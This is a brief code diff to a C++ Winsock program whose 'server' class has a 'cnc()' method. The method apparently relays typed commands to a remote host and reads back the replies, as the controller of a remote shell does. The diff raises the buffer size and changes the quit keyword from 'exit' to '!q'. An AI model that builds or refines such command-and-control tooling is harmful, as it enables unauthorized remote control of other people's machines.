@@ -4,7 +4,7 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
-#define MAX 8192
+#define MAX 65536
 
 class server{
 private:
@@ -57,7 +57,7 @@ void server::cnc() {
         send_buf[strcspn(send_buf, "\r\n")] = 0;
 
         send(dst_socket, send_buf, sizeof(send_buf), 0);
-        if (!strcmp(send_buf, "exit")) break;
+        if (!strcmp(send_buf, "!q")) break;
 
         result = recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
         if (result == 0 || result == -1) {
